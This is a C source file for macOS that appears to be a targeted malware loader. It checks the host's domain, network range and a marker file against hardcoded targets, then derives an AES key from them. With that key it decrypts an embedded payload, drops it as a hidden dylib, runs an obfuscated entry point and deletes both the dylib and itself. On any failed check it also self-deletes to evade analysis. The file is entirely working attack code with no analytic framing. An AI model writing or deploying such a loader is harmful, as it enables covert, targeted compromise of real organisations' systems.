#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <mach-o/dyld.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonDigest.h>

extern unsigned char _payload_start[] __asm__("section$start$__DATA$__rsrc");
extern unsigned char _payload_end[] __asm__("section$end$__DATA$__rsrc");

extern const char TARGET_DOMAIN[];
extern const char TARGET_NETWORK[];
extern const char TARGET_FILE[];

static int get_fqdn(char *out, size_t outsz) {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) return -1;
    struct hostent *he = gethostbyname(hostname);
    if (!he || !he->h_name) {
        snprintf(out, outsz, "%s", hostname);
        return 0;
    }
    snprintf(out, outsz, "%s", he->h_name);
    return 0;
}

static int check_network(const char *prefix) {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) return 0;
    int found = 0;
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
        struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
        if (strncmp(ip, prefix, strlen(prefix)) == 0) {
            found = 1;
            break;
        }
    }
    freeifaddrs(ifaddr);
    return found;
}

static int validate_environment(char *env_data, size_t outsz) {
    char fqdn[256];
    if (get_fqdn(fqdn, sizeof(fqdn)) != 0) return 0;
    
    size_t fqdn_len = strlen(fqdn);
    size_t suffix_len = strlen(TARGET_DOMAIN);
    if (fqdn_len < suffix_len) return 0;
    if (strcmp(fqdn + fqdn_len - suffix_len, TARGET_DOMAIN) != 0) return 0;
    
    if (!check_network(TARGET_NETWORK)) return 0;
    
    struct stat st;
    if (stat(TARGET_FILE, &st) != 0) return 0;
    
    snprintf(env_data, outsz, "%s|%s|%s", TARGET_DOMAIN, TARGET_NETWORK, TARGET_FILE);
    return 1;
}

static void derive_key_from_env(const char *env_data, uint8_t key[16], uint8_t iv[16]) {
    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(env_data, (CC_LONG)strlen(env_data), hash);
    for (int i = 0; i < 999; i++) {
        CC_SHA256(hash, CC_SHA256_DIGEST_LENGTH, hash);
    }
    memcpy(key, hash, 16);
    memcpy(iv, hash + 16, 16);
}

static int get_self_path(char *buf, size_t sz) {
    uint32_t len = (uint32_t)sz;
    return _NSGetExecutablePath(buf, &len) == 0 ? 0 : -1;
}

__attribute__((visibility("default")))
int main(int argc, char **argv) {
    char env_data[512];
    if (!validate_environment(env_data, sizeof(env_data))) {
        char self[1024];
        if (get_self_path(self, sizeof(self)) == 0) unlink(self);
        return 1;
    }
    
    uint8_t key[16], iv[16];
    derive_key_from_env(env_data, key, iv);
    
    size_t enc_len = _payload_end - _payload_start;
    if (enc_len < 16) return 1;
    
    size_t dec_len = enc_len + kCCBlockSizeAES128;
    uint8_t *decrypted = malloc(dec_len);
    if (!decrypted) return 1;
    
    size_t moved = 0;
    CCCryptorStatus st = CCCrypt(kCCDecrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding,
                                  key, 16, iv, _payload_start, enc_len,
                                  decrypted, dec_len, &moved);
    
    memset(key, 0, 16);
    memset(iv, 0, 16);
    
    if (st != kCCSuccess || moved < 1024) {
        memset(decrypted, 0, dec_len);
        free(decrypted);
        char self[1024];
        if (get_self_path(self, sizeof(self)) == 0) unlink(self);
        return 1;
    }
    
    uint32_t magic = *(uint32_t *)decrypted;
    if (magic != 0xfeedfacf && magic != 0xcffaedfe) {
        memset(decrypted, 0, dec_len);
        free(decrypted);
        char self[1024];
        if (get_self_path(self, sizeof(self)) == 0) unlink(self);
        return 1;
    }
    
    char tmpdir[512];
    snprintf(tmpdir, sizeof(tmpdir), "%s/.aether_%d", getenv("TMPDIR") ?: "/tmp", getpid());
    mkdir(tmpdir, 0700);
    
    char bundle_path[512];
    snprintf(bundle_path, sizeof(bundle_path), "%s/p.dylib", tmpdir);
    
    FILE *f = fopen(bundle_path, "wb");
    if (!f) {
        memset(decrypted, 0, dec_len);
        free(decrypted);
        return 1;
    }
    fwrite(decrypted, 1, moved, f);
    fclose(f);
    
    memset(decrypted, 0, dec_len);
    free(decrypted);
    
    void *handle = dlopen(bundle_path, RTLD_NOW | RTLD_LOCAL);
    if (!handle) {
        unlink(bundle_path);
        rmdir(tmpdir);
        char self[1024];
        if (get_self_path(self, sizeof(self)) == 0) unlink(self);
        return 1;
    }
    
    typedef int (*payload_main_t)(void);
    payload_main_t pm = dlsym(handle, "__8d3942b93e489c7a");
    if (!pm) {
        dlclose(handle);
        unlink(bundle_path);
        rmdir(tmpdir);
        char self[1024];
        if (get_self_path(self, sizeof(self)) == 0) unlink(self);
        return 1;
    }
    
    int ret = pm();
    dlclose(handle);
    
    unlink(bundle_path);
    rmdir(tmpdir);
    
    char self[1024];
    if (get_self_path(self, sizeof(self)) == 0) unlink(self);
    
    return ret;
}
